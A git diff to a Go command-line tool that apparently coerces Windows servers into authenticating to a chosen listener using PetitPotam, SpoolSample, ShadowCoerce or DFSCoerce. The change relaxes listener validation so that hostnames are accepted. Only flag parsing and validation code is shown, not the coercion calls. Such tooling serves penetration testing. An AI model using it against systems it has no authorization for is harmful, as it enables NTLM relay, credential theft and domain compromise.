@@ -156,7 +156,7 @@ func main() {
 
 	// Define flags
 	cli.Flag(&target, "t", "target", "", "Target server IP address")
-	cli.Flag(&listener, "l", "listener", "", "Listener IP for callback. For HTTP: use IP@PORT/path (e.g., 10.1.1.99@80/test)")
+	cli.Flag(&listener, "l", "listener", "", "Listener IP or hostname for callback. For HTTP: use IP@PORT/path (e.g., 10.1.1.99@80/test)")
 	cli.Flag(&username, "u", "user", "", "Domain username")
 	cli.Flag(&domain, "d", "domain", "", "Domain name")
 	cli.Flag(&password, "p", "password", "", "Password (prompted if not provided)")
@@ -183,7 +183,8 @@ func main() {
 		fmt.Printf("[!] Error: Invalid target IP address: %s\n", target)
 		os.Exit(1)
 	}
-	// For HTTP mode, allow IP:port format; for UNC mode, require strict IP
+
+	// For HTTP mode, allow IP:port format or hostnames; for UNC mode, allow IP or hostname
 	if useHTTP {
 		// HTTP mode: automatically construct WebDAV path if not provided
 		if listener == "" {
@@ -193,7 +194,7 @@ func main() {
 
 		// Auto-construct WebDAV format: IP@80/test (unless user provided full format)
 		if !strings.Contains(listener, "@") {
-			// Just an IP - construct full WebDAV path automatically
+			// Just an IP or hostname - construct full WebDAV path automatically
 			listener = listener + "@80/test"
 			fmt.Printf("[+] HTTP/WebDAV mode: Auto-constructed listener path: %s\n", listener)
 		} else {
@@ -216,14 +217,16 @@ func main() {
 		fmt.Println("[!] NOTE: SpoolSample (-m spoolsample) often works better for HTTP coercion")
 		fmt.Println("[!]       PetitPotam may not reliably trigger WebClient on all Windows versions")
 	} else {
-		if !isValidIP(listener) {
-			fmt.Printf("[!] Error: Invalid listener IP address: %s\n", listener)
+		// UNC mode: allow both IP addresses and hostnames
+		if listener == "" {
+			fmt.Println("[!] Error: Listener required")
 			os.Exit(1)
 		}
+		// No strict validation - UNC paths work with both IPs and hostnames
+		fmt.Printf("[+] SMB/UNC mode: Using listener %s\n", listener)
 	}
 
-	// Validate method (case-insensitive)
-	method = strings.ToLower(method)
+	// Validate method
 	validMethods := []string{"petitpotam", "spoolsample", "shadowcoerce", "dfscoerce"}
 	methodValid := false
 	for _, vm := range validMethods {
